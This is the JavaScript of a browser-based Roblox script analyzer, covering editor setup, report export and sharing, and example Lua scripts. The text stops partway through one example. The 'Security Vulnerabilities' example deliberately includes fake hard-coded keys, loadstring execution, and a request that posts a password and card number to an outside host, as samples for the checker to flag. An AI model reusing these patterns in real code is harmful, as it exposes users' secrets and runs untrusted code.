document.addEventListener('DOMContentLoaded', function() {
    
    const editor = CodeMirror(document.getElementById('codeEditor'), {
        mode: 'lua',
        theme: 'monokai',
        lineNumbers: true,
        indentUnit: 4,
        lineWrapping: true,
        matchBrackets: true,
        autoCloseBrackets: true,
        foldGutter: true,
        gutters: ["CodeMirror-linenumbers", "CodeMirror-foldgutter"],
        placeholder: "-- Your Roblox script goes here\n-- Example:\nlocal player = game.Players.LocalPlayer\nprint('Hello, ' .. player.Name .. '!')",
        extraKeys: {
            "Ctrl-Space": "autocomplete",
            "Tab": function(cm) {
                if (cm.somethingSelected()) {
                    cm.indentSelection("add");
                } else {
                    cm.replaceSelection(Array(cm.getOption("indentUnit") + 1).join(" "));
                }
            }
        }
    });
    
    editor.setSize(null, 300);
    
    const analyzeBtn = document.getElementById('analyzeBtn');
    const clearBtn = document.getElementById('clearBtn');
    const exampleBtn = document.getElementById('exampleBtn');
    const exportBtn = document.getElementById('exportBtn');
    const shareBtn = document.getElementById('shareBtn');
    const resultsSection = document.getElementById('resultsSection');
    
    
    const fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.accept = '.lua,.luau,.txt';
    fileInput.style.display = 'none';
    document.body.appendChild(fileInput);
    
    const checker = new RobloxScriptChecker();
    
    const exampleScript = `-- Example Roblox script with various issues
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- Deprecated functions (will be flagged)
spawn(function()
    while true do
        wait(1)  -- Should use task.wait()
        print("Loop running")
    end
end)

-- Security issue (will be flagged)
game.ReplicatedStorage.RemoteEvent:FireServer("unsafeData")

-- Performance issue (will be flagged)
for i = 1, 1000 do
    local part = Instance.new("Part")
    part.Parent = workspace
end

-- Better practices
local RunService = game:GetService("RunService")
local connection = RunService.Heartbeat:Connect(function()
    -- Do something
end)

-- Remember to disconnect
connection:Disconnect()`;
    
    
    if (clearBtn) {
        clearBtn.addEventListener('click', function() {
            try {
                clearEditor();
            } catch (error) {
                showNotification('Error during clear: ' + error.message, 'warning');
            }
        });
    }
    
    
    if (exampleBtn) {
        exampleBtn.addEventListener('click', function() {
            try {
                loadExampleScript();
            } catch (error) {
                showNotification('Error during load: ' + error.message, 'warning');
            }
        });
    }
    
    
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.key === 'o') {
            e.preventDefault();
            loadFromFile();
        }
        if (e.ctrlKey && e.key === 's') {
            e.preventDefault();
            saveCurrentScript();
        }
    });
    
    analyzeBtn.addEventListener('click', function() {
        const script = editor.getValue().trim();
        
        if (!script) {
            showNotification('Please enter a script to analyze', 'warning');
            return;
        }
        
        showLoadingState();
        
        setTimeout(() => {
            const results = checker.analyzeScript(script);
            displayResults(results);
            hideLoadingState();
            showResults();
        }, 1000);
    });
    
    document.addEventListener('click', function(e) {
        if (e.target.classList.contains('collapse-btn')) {
            const targetId = e.target.getAttribute('data-target');
            const targetList = document.getElementById(targetId);
            
            if (targetList) {
                targetList.classList.toggle('collapsed');
                e.target.textContent = targetList.classList.contains('collapsed') ? '+' : '−';
            }
        }
        
        if (e.target.classList.contains('category-header')) {
            const collapseBtn = e.target.querySelector('.collapse-btn');
            if (collapseBtn) {
                collapseBtn.click();
            }
        }
    });
    
    function showLoadingState() {
        const btnIcon = analyzeBtn.querySelector('.btn-icon');
        const btnText = analyzeBtn.querySelector('.btn-text');
        const btnLoading = analyzeBtn.querySelector('.btn-loading');
        
        btnIcon.style.display = 'none';
        btnText.style.display = 'none';
        btnLoading.style.display = 'inline';
        analyzeBtn.disabled = true;
        analyzeBtn.classList.add('loading');
    }
    
    function hideLoadingState() {
        const btnIcon = analyzeBtn.querySelector('.btn-icon');
        const btnText = analyzeBtn.querySelector('.btn-text');
        const btnLoading = analyzeBtn.querySelector('.btn-loading');
        
        btnIcon.style.display = 'inline';
        btnText.style.display = 'inline';
        btnLoading.style.display = 'none';
        analyzeBtn.disabled = false;
        analyzeBtn.classList.remove('loading');
    }
    
    function showResults() {
        resultsSection.style.display = 'block';
        resultsSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
    
    function hideResults() {
        resultsSection.style.display = 'none';
    }
    
    function showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        let backgroundColor = '#667eea'; 
        if (type === 'warning') backgroundColor = '#ed8936';
        else if (type === 'success') backgroundColor = '#38a169';
        
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: ${backgroundColor};
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            z-index: 1000;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            animation: slideInRight 0.3s ease;
        `;
        notification.textContent = message;
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.style.animation = 'slideOutRight 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }

    let currentResults = null;
    let codeHealthHistory = [];

    
    
    

    function analyzeCodeHealth(results) {
        const health = {
            timestamp: new Date().toISOString(),
            overallScore: calculateOverallScore(results),
            metrics: {
                lineCount: results.lineCount,
                commentCount: results.commentCount,
                nestingLevel: results.nestingLevel,
                commentRatio: results.commentCount / Math.max(results.lineCount, 1)
            },
            issues: {
                security: results.securityIssues?.length || 0,
                deprecations: results.deprecations?.length || 0,
                api: results.apiIssues?.length || 0,
                performance: results.inefficiencies?.length || 0,
                quality: results.lintIssues?.length || 0
            },
            recommendations: generateHealthRecommendations(results)
        };

        
        codeHealthHistory.unshift(health);
        if (codeHealthHistory.length > 10) {
            codeHealthHistory = codeHealthHistory.slice(0, 10);
        }

        return health;
    }

    function generateHealthRecommendations(results) {
        const recommendations = [];
        
        
        if ((results.securityIssues?.length || 0) > 0) {
            recommendations.push({
                priority: 'high',
                category: 'Security',
                message: 'Address security vulnerabilities immediately',
                actions: ['Validate remote calls', 'Remove loadstring usage', 'Sanitize HTTP responses']
            });
        }

        
        if ((results.deprecations?.length || 0) > 0) {
            recommendations.push({
                priority: 'high',
                category: 'Deprecations',
                message: 'Update deprecated APIs to modern alternatives',
                actions: ['Replace wait() with task.wait()', 'Use Animator:LoadAnimation()', 'Update to new constraint system']
            });
        }

        
        if (results.commentCount / Math.max(results.lineCount, 1) < 0.1) {
            recommendations.push({
                priority: 'medium',
                category: 'Documentation',
                message: 'Add more comments to improve code maintainability',
                actions: ['Document complex functions', 'Add module descriptions', 'Explain business logic']
            });
        }

        
        if ((results.inefficiencies?.length || 0) > 0) {
            recommendations.push({
                priority: 'medium',
                category: 'Performance',
                message: 'Optimize code for better performance',
                actions: ['Cache service references', 'Use proper yielding', 'Optimize loops']
            });
        }

        
        if (results.nestingLevel > 4) {
            recommendations.push({
                priority: 'medium',
                category: 'Complexity',
                message: 'Reduce code complexity by refactoring nested structures',
                actions: ['Extract functions', 'Use early returns', 'Simplify conditional logic']
            });
        }

        return recommendations;
    }

    function getHealthTrend() {
        if (codeHealthHistory.length < 2) return 'stable';
        
        const current = codeHealthHistory[0].overallScore;
        const previous = codeHealthHistory[1].overallScore;
        
        if (current > previous + 5) return 'improving';
        if (current < previous - 5) return 'declining';
        return 'stable';
    }

    
    if (exportBtn) {
        exportBtn.addEventListener('click', function() {
            try {
                if (!currentResults) {
                    showNotification('No analysis results to export', 'warning');
                    return;
                }
                exportAdvancedReport(currentResults);
            } catch (error) {
                showNotification('Error during export: ' + error.message, 'warning');
            }
        });
    }

    if (shareBtn) {
        shareBtn.addEventListener('click', function() {
            try {
                if (!currentResults) {
                    showNotification('No analysis results to share', 'warning');
                    return;
                }
                enhancedShareResults(currentResults);
            } catch (error) {
                showNotification('Error during share: ' + error.message, 'warning');
            }
        });
    }

    function exportReport(results) {
        const report = generateReport(results);
        const blob = new Blob([report], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `roblox-script-analysis-${new Date().toISOString().split('T')[0]}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        showNotification('Report exported successfully!', 'success');
    }

    function shareResults(results) {
        const report = generateReport(results);
        if (navigator.share) {
            navigator.share({
                title: 'Roblox Script Analysis Report',
                text: report.substring(0, 200) + '...',
                files: [new File([report], 'analysis-report.txt', { type: 'text/plain' })]
            }).then(() => {
                showNotification('Report shared successfully!', 'success');
            }).catch(() => {
                fallbackShare(report);
            });
        } else {
            fallbackShare(report);
        }
    }

    function fallbackShare(report) {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(report).then(() => {
                showNotification('Report copied to clipboard!', 'success');
            }).catch(() => {
                showNotification('Unable to copy to clipboard', 'warning');
            });
        } else {
            showNotification('Sharing not supported on this device', 'warning');
        }
    }

    function generateReport(results) {
        const date = new Date().toLocaleDateString();
        const score = calculateOverallScore(results);
        
        let report = `ROBLOX SCRIPT ANALYSIS REPORT\n`;
        report += `Generated on: ${date}\n`;
        report += `═══════════════════════════════════\n\n`;
        
        report += `OVERALL SCORE: ${score}/100\n`;
        report += `Lines of Code: ${results.lineCount}\n`;
        report += `Comments: ${results.commentCount}\n`;
        report += `Max Nesting Level: ${results.nestingLevel}\n\n`;
        
        const totalIssues = (results.deprecations?.length || 0) +
                           (results.securityIssues?.length || 0) +
                           (results.apiIssues?.length || 0) +
                           (results.inefficiencies?.length || 0) +
                           (results.lintIssues?.length || 0);
        
        report += `TOTAL ISSUES: ${totalIssues}\n\n`;
        
        
        if (results.securityIssues?.length > 0) {
            report += `🔒 SECURITY ISSUES (${results.securityIssues.length})\n`;
            report += `${'-'.repeat(40)}\n`;
            results.securityIssues.forEach((issue, i) => {
                report += `${i + 1}. Line ${issue.line}: ${issue.message}\n`;
                if (issue.suggestion) report += `   Suggestion: ${issue.suggestion}\n`;
                report += `\n`;
            });
        }
        
        
        if (results.deprecations?.length > 0) {
            report += `⚠️  DEPRECATIONS (${results.deprecations.length})\n`;
            report += `${'-'.repeat(40)}\n`;
            results.deprecations.forEach((issue, i) => {
                report += `${i + 1}. Line ${issue.line}: ${issue.message}\n`;
                if (issue.suggestion) report += `   Suggestion: ${issue.suggestion}\n`;
                if (issue.docUrl) report += `   Documentation: ${issue.docUrl}\n`;
                report += `\n`;
            });
        }
        
        
        if (results.apiIssues?.length > 0) {
            report += `🔧 API ISSUES (${results.apiIssues.length})\n`;
            report += `${'-'.repeat(40)}\n`;
            results.apiIssues.forEach((issue, i) => {
                report += `${i + 1}. Line ${issue.line}: ${issue.message}\n`;
                report += `\n`;
            });
        }
        
        
        if (results.inefficiencies?.length > 0) {
            report += `⚡ PERFORMANCE ISSUES (${results.inefficiencies.length})\n`;
            report += `${'-'.repeat(40)}\n`;
            results.inefficiencies.forEach((issue, i) => {
                report += `${i + 1}. Line ${issue.line}: ${issue.message}\n`;
                report += `\n`;
            });
        }
        
        
        if (results.lintIssues?.length > 0) {
            report += `✨ CODE QUALITY ISSUES (${results.lintIssues.length})\n`;
            report += `${'-'.repeat(40)}\n`;
            results.lintIssues.forEach((issue, i) => {
                report += `${i + 1}. Line ${issue.line}: ${issue.message}\n`;
                report += `\n`;
            });
        }
        
        report += `\n═══════════════════════════════════\n`;
        report += `Generated by Roblox Script Analyzer\n`;
        
        return report;
    }

    
    
    

    function exportAdvancedReport(results) {
        const formats = ['txt', 'json', 'csv', 'html'];
        
        
        const modal = createExportModal(formats);
        document.body.appendChild(modal);
        
        modal.addEventListener('click', function(e) {
            if (e.target.classList.contains('export-format-btn')) {
                const format = e.target.dataset.format;
                downloadReport(results, format);
                document.body.removeChild(modal);
            }
            if (e.target.classList.contains('modal-close') || e.target.classList.contains('export-modal')) {
                document.body.removeChild(modal);
            }
        });
    }

    function createExportModal(formats) {
        const modal = document.createElement('div');
        modal.className = 'export-modal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;

        modal.innerHTML = `
            <div class="export-dialog" style="
                background: white;
                padding: 30px;
                border-radius: 12px;
                max-width: 400px;
                width: 90%;
                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            ">
                <h3 style="margin-top: 0; color: #2d3748;">Export Analysis Report</h3>
                <p style="color: #718096; margin-bottom: 20px;">Choose your preferred export format:</p>
                
                <div class="export-formats" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                    ${formats.map(format => `
                        <button class="export-format-btn" data-format="${format}" style="
                            padding: 12px 20px;
                            border: 2px solid #e2e8f0;
                            background: white;
                            border-radius: 8px;
                            cursor: pointer;
                            transition: all 0.2s;
                            text-transform: uppercase;
                            font-weight: bold;
                            color: #4a5568;
                        ">${format}</button>
                    `).join('')}
                </div>
                
                <button class="modal-close" style="
                    margin-top: 20px;
                    padding: 10px 20px;
                    background: #e53e3e;
                    color: white;
                    border: none;
                    border-radius: 6px;
                    cursor: pointer;
                    float: right;
                ">Cancel</button>
            </div>
        `;

        return modal;
    }

    function downloadReport(results, format) {
        let content, filename, mimeType;
        const date = new Date().toISOString().split('T')[0];
        
        switch (format) {
            case 'json':
                content = JSON.stringify({
                    analysis: results,
                    health: analyzeCodeHealth(results),
                    exportedAt: new Date().toISOString()
                }, null, 2);
                filename = `roblox-analysis-${date}.json`;
                mimeType = 'application/json';
                break;
                
            case 'csv':
                content = generateCSVReport(results);
                filename = `roblox-analysis-${date}.csv`;
                mimeType = 'text/csv';
                break;
                
            case 'html':
                content = generateHTMLReport(results);
                filename = `roblox-analysis-${date}.html`;
                mimeType = 'text/html';
                break;
                
            default: 
                content = generateReport(results);
                filename = `roblox-analysis-${date}.txt`;
                mimeType = 'text/plain';
        }

        const blob = new Blob([content], { type: mimeType });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        showNotification(`${format.toUpperCase()} report exported successfully!`, 'success');
    }

    function generateCSVReport(results) {
        let csv = 'Category,Line,Severity,Message,Suggestion\n';
        
        const addIssues = (issues, category) => {
            issues?.forEach(issue => {
                csv += `"${category}","${issue.line}","${issue.severity || 'N/A'}","${issue.message}","${issue.suggestion || 'N/A'}"\n`;
            });
        };

        addIssues(results.securityIssues, 'Security');
        addIssues(results.deprecations, 'Deprecation');
        addIssues(results.apiIssues, 'API');
        addIssues(results.inefficiencies, 'Performance');
        addIssues(results.lintIssues, 'Quality');

        return csv;
    }

    function generateHTMLReport(results) {
        const health = analyzeCodeHealth(results);
        const score = health.overallScore;
        
        return `<!DOCTYPE html>
<html>
<head>
    <title>Roblox Script Analysis Report</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        .score { font-size: 48px; font-weight: bold; color: ${score >= 80 ? '#38a169' : score >= 60 ? '#ed8936' : '#e53e3e'}; }
        .metrics { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }
        .metric-card { background: #f7fafc; padding: 20px; border-radius: 8px; text-align: center; }
        .issues { margin-top: 30px; }
        .issue-category { margin-bottom: 25px; }
        .issue-category h3 { color: #2d3748; border-bottom: 2px solid #e2e8f0; padding-bottom: 5px; }
        .issue-item { background: white; padding: 15px; margin: 10px 0; border-left: 4px solid #ed8936; border-radius: 4px; }
        .recommendations { background: #ebf8ff; padding: 20px; border-radius: 8px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Roblox Script Analysis Report</h1>
        <div class="score">${score}/100</div>
        <p>Generated on ${new Date().toLocaleDateString()}</p>
    </div>
    
    <div class="metrics">
        <div class="metric-card"><h3>Lines of Code</h3><p>${results.lineCount}</p></div>
        <div class="metric-card"><h3>Comments</h3><p>${results.commentCount}</p></div>
        <div class="metric-card"><h3>Nesting Level</h3><p>${results.nestingLevel}</p></div>
        <div class="metric-card"><h3>Total Issues</h3><p>${(results.securityIssues?.length || 0) + (results.deprecations?.length || 0) + (results.apiIssues?.length || 0) + (results.inefficiencies?.length || 0) + (results.lintIssues?.length || 0)}</p></div>
    </div>
    
    <div class="issues">
        ${generateHTMLIssueSection('Security Issues', results.securityIssues)}
        ${generateHTMLIssueSection('Deprecations', results.deprecations)}
        ${generateHTMLIssueSection('API Issues', results.apiIssues)}
        ${generateHTMLIssueSection('Performance Issues', results.inefficiencies)}
        ${generateHTMLIssueSection('Code Quality Issues', results.lintIssues)}
    </div>
    
    <div class="recommendations">
        <h3>Recommendations</h3>
        ${health.recommendations.map(rec => `
            <div style="margin: 10px 0;">
                <strong>${rec.category}:</strong> ${rec.message}
                <ul>${rec.actions.map(action => `<li>${action}</li>`).join('')}</ul>
            </div>
        `).join('')}
    </div>
</body>
</html>`;
    }

    function generateHTMLIssueSection(title, issues) {
        if (!issues || issues.length === 0) return `<div class="issue-category"><h3>${title} (0)</h3><p>No issues found ✅</p></div>`;
        
        return `
            <div class="issue-category">
                <h3>${title} (${issues.length})</h3>
                ${issues.map(issue => `
                    <div class="issue-item">
                        <strong>Line ${issue.line}:</strong> ${issue.message}
                        ${issue.suggestion ? `<br><em>Suggestion: ${issue.suggestion}</em>` : ''}
                    </div>
                `).join('')}
            </div>
        `;
    }

    function enhancedShareResults(results) {
        const health = analyzeCodeHealth(results);
        const shareOptions = [
            { name: 'Quick Summary', type: 'summary' },
            { name: 'Full Report', type: 'full' },
            { name: 'Issues Only', type: 'issues' },
            { name: 'Health Score', type: 'health' }
        ];

        const modal = createShareModal(shareOptions);
        document.body.appendChild(modal);
        
        modal.addEventListener('click', function(e) {
            if (e.target.classList.contains('share-option-btn')) {
                const type = e.target.dataset.type;
                performShare(results, health, type);
                document.body.removeChild(modal);
            }
            if (e.target.classList.contains('modal-close') || e.target.classList.contains('share-modal')) {
                document.body.removeChild(modal);
            }
        });
    }

    function createShareModal(options) {
        const modal = document.createElement('div');
        modal.className = 'share-modal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;

        modal.innerHTML = `
            <div class="share-dialog" style="
                background: white;
                padding: 30px;
                border-radius: 12px;
                max-width: 400px;
                width: 90%;
                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            ">
                <h3 style="margin-top: 0; color: #2d3748;">Share Analysis Results</h3>
                <p style="color: #718096; margin-bottom: 20px;">Choose what to share:</p>
                
                <div class="share-options" style="display: grid; gap: 10px;">
                    ${options.map(option => `
                        <button class="share-option-btn" data-type="${option.type}" style="
                            padding: 12px 20px;
                            border: 2px solid #e2e8f0;
                            background: white;
                            border-radius: 8px;
                            cursor: pointer;
                            transition: all 0.2s;
                            font-weight: bold;
                            color: #4a5568;
                            text-align: left;
                        ">${option.name}</button>
                    `).join('')}
                </div>
                
                <button class="modal-close" style="
                    margin-top: 20px;
                    padding: 10px 20px;
                    background: #e53e3e;
                    color: white;
                    border: none;
                    border-radius: 6px;
                    cursor: pointer;
                    float: right;
                ">Cancel</button>
            </div>
        `;

        return modal;
    }

    function performShare(results, health, type) {
        let content;
        
        switch (type) {
            case 'summary':
                content = `🔍 Roblox Script Analysis Summary\n\nScore: ${health.overallScore}/100\nLines: ${results.lineCount} | Comments: ${results.commentCount}\nIssues: ${health.issues.security + health.issues.deprecations + health.issues.api + health.issues.performance + health.issues.quality}\n\n✨ Analyzed with Roblox Script Analyzer`;
                break;
            case 'health':
                const trend = getHealthTrend();
                content = `💊 Code Health Report\n\nOverall Score: ${health.overallScore}/100\nTrend: ${trend === 'improving' ? '📈' : trend === 'declining' ? '📉' : '➡️'} ${trend.charAt(0).toUpperCase() + trend.slice(1)}\n\nTop Priority: ${health.recommendations[0]?.category || 'None'}\n\n⚡ Generated by Roblox Script Analyzer`;
                break;
            case 'issues':
                content = `⚠️ Script Issues Report\n\n🔒 Security: ${health.issues.security}\n⚠️ Deprecations: ${health.issues.deprecations}\n🔧 API Issues: ${health.issues.api}\n⚡ Performance: ${health.issues.performance}\n✨ Quality: ${health.issues.quality}\n\n🛠️ Get detailed analysis at Roblox Script Analyzer`;
                break;
            default: 
                content = generateReport(results);
        }

        if (navigator.share) {
            navigator.share({
                title: 'Roblox Script Analysis',
                text: content
            }).then(() => {
                showNotification('Results shared successfully!', 'success');
            }).catch(() => {
                fallbackShare(content);
            });
        } else {
            fallbackShare(content);
        }
    }

    
    
    

    function clearEditor() {
        if (editor.getValue().trim() && !confirm('Are you sure you want to clear the editor? Any unsaved work will be lost.')) {
            return;
        }
        
        editor.setValue('');
        hideResults();
        currentResults = null;
        
        
        document.getElementById('overallScore').textContent = '--';
        document.getElementById('scoreDescription').textContent = 'Run analysis to see code health score';
        document.getElementById('scoreCircle').style.background = '';
        
        ['lineCount', 'commentCount', 'nestingLevel', 'totalIssues'].forEach(id => {
            document.getElementById(id).textContent = '0';
        });
        
        showNotification('Editor cleared successfully', 'success');
    }

    function loadExampleScript() {
        const examples = [
            {
                name: 'Legacy Script (Many Issues)',
                description: 'Common deprecated APIs and poor practices',
                code: `local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

spawn(function()
    while true do
        wait(1)
        print("Loop running every second")
    end
end)

delay(5, function()
    print("Delayed execution")
end)

local animation = Instance.new("Animation")
animation.AnimationId = "rbxassetid://123456789"
local animTrack = humanoid:LoadAnimation(animation)

local bodyVelocity = Instance.new("BodyVelocity")
bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
bodyVelocity.Velocity = Vector3.new(0, 50, 0)
bodyVelocity.Parent = character.HumanoidRootPart

game.ReplicatedStorage.RemoteEvent:FireServer("unvalidated_data")

local ray = Ray.new(character.HumanoidRootPart.Position, Vector3.new(0, -10, 0))
local hit, position = workspace:FindPartOnRay(ray)`
            },
            {
                name: 'Security Vulnerabilities',
                description: 'Examples of common security issues',
                code: `local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local remoteEvent = ReplicatedStorage:WaitForChild("ProcessData")

local API_KEY = "sk_live_abcd1234567890efgh1234567890ijkl"
local SECRET_TOKEN = "bearer_xyz789abc123def456ghi789"

remoteEvent:FireServer({
    userId = player.UserId,
    coins = 999999,
    level = 100,
    items = {"Sword", "Shield", "Potion"}
})

local maliciousCode = 'game.Players:GetPlayers()[1]:Kick("Hacked!")'
loadstring(maliciousCode)()

local response = HttpService:GetAsync("http://suspicious-site.com/api/user-data")
local userData = HttpService:JSONDecode(response)

player.Character.Humanoid.Health = 0

local dataToSend = {
    password = "mySecretPassword123",
    creditCard = "4532-1234-5678-9012"
}
HttpService:PostAsync("https://external-api.com/submit", HttpService:JSONEncode(dataToSend))`
            },
            {
                name: 'Performance Problems',
                description: 'Inefficient code patterns that hurt performance',
                code: `local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer

while true do
    wait(0.03)
    
    for i = 1, 500 do
        local part = Instance.new("Part")
        part.Name = "Part" .. i
        part.Size = Vector3.new(1, 1, 1)
        part.Position = Vector3.new(math.random(-50, 50), 10, math.random(-50, 50))
        part.Parent = workspace
        
        for _, otherPart in pairs(workspace:GetChildren()) do
            if otherPart:IsA("Part") and otherPart ~= part then
                local distance = (part.Position - otherPart.Position).Magnitude
                if distance < 5 then
                    part.BrickColor = BrickColor.Red()
                end
            end
        end
    end
    
    local allParts = {}
    for _, obj in pairs(workspace:GetChildren()) do
        if obj:IsA("Part") then
            table.insert(allParts, obj.Name .. " at " .. tostring(obj.Position))
        end
    end
    local partList = table.concat(allParts, ", ")
    print("Parts: " .. partList)
end

spawn(function()
    while true do
        local runService = game:GetService("RunService")
        local players = game:GetService("Players")
        local lighting = game:GetService("Lighting")
        wait(0.1)
    end
end)`
            },
            {
                name: 'Modern Best Practices',
                description: 'Clean, efficient code following current standards',
                code: `local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local remoteEvent = ReplicatedStorage:WaitForChild("ValidatedRemote")

local character = player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local animator = humanoid:WaitForChild("Animator")
local rootPart = character:WaitForChild("HumanoidRootPart")

local animation = Instance.new("Animation")
animation.AnimationId = "rbxassetid://123456789"
local animationTrack = animator:LoadAnimation(animation)

local attachment = Instance.new("Attachment")
attachment.Name = "MovementAttachment"
attachment.Parent = rootPart

local linearVelocity = Instance.new("LinearVelocity")
linearVelocity.Attachment0 = attachment
linearVelocity.MaxForce = 4000
linearVelocity.VectorVelocity = Vector3.new(0, 0, 0)
linearVelocity.Parent = rootPart

local function validateAndSendData(data)
    if type(data) == "table" and data.action and type(data.action) == "string" then
        remoteEvent:FireServer(data)
    end
end

local raycastParams = RaycastParams.new()
raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
raycastParams.FilterDescendantsInstances = {character}

local function performRaycast()
    local origin = rootPart.Position
    local direction = Vector3.new(0, -10, 0)
    
    local result = workspace:Raycast(origin, direction, raycastParams)
    if result then
        return result.Instance, result.Position
    end
    return nil, nil
end

local connections = {}

connections.heartbeat = RunService.Heartbeat:Connect(function()
    local hit, position = performRaycast()
    if hit then
        linearVelocity.VectorVelocity = Vector3.new(0, 0, 0)
    end
end)

connections.playerRemoving = Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == player then
        animationTrack:Stop()
        linearVelocity:Destroy()
        
        for _, connection in pairs(connections) do
            if connection then
                connection:Disconnect()
            end
        end
    end
end)

task.spawn(function()
    while character and character.Parent do
        task.wait(1)
        validateAndSendData({
            action = "heartbeat",
            timestamp = tick()
        })
    end
end)`
            },
            {
                name: 'GUI System Example',
                description: 'Professional GUI creation with proper practices',
                code: `local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MainInterface"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 400, 0, 300)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "Title"
titleLabel.Size = UDim2.new(1, 0, 0, 50)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Game Interface"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.Parent = mainFrame

local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -35, 0, 10)
closeButton.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
closeButton.Text = "×"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextScaled = true
closeButton.Font = Enum.Font.SourceSansBold
closeButton.Parent = mainFrame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 4)
closeCorner.Parent = closeButton

local function animateButton(button, hoverScale)
    hoverScale = hoverScale or 1.1
    
    button.MouseEnter:Connect(function()
        local tween = TweenService:Create(button, 
            TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = button.Size * hoverScale}
        )
        tween:Play()
    end)
    
    button.MouseLeave:Connect(function()
        local tween = TweenService:Create(button,
            TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = button.Size / hoverScale}
        )
        tween:Play()
    end)
end

local function slideIn()
    mainFrame.Position = UDim2.new(0.5, -200, -1, 0)
    mainFrame.Visible = true
    
    local tween = TweenService:Create(mainFrame,
        TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        {Position = UDim2.new(0.5, -200, 0.5, -150)}
    )
    tween:Play()
end

local function slideOut()
    local tween = TweenService:Create(mainFrame,
        TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In),
        {Position = UDim2.new(0.5, -200, 1.5, 0)}
    )
    tween:Play()
    
    tween.Completed:Connect(function()
        screenGui:Destroy()
    end)
end

animateButton(closeButton, 1.2)

closeButton.Activated:Connect(slideOut)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.E then
        if screenGui.Parent then
            slideOut()
        end
    end
end)

slideIn()`
            },
            {
                name: 'DataStore Best Practices',
                description: 'Safe and efficient data persistence',
                code: `local Players = game:GetService("Players")
local DataStoreService = game:GetService("DataStoreService")
local RunService = game:GetService("RunService")

local playerDataStore = DataStoreService:GetDataStore("PlayerData_v2")
local defaultPlayerData = {
    coins = 100,
    level = 1,
    experience = 0,
    inventory = {"Starter Sword"},
    settings = {
        musicVolume = 0.5,
        soundVolume = 0.8,
        graphics = "Medium"
    },
    lastLogin = 0
}

local playerDataCache = {}
local pendingSaves = {}

local function deepCopy(original)
    local copy = {}
    for key, value in pairs(original) do
        if type(value) == "table" then
            copy[key] = deepCopy(value)
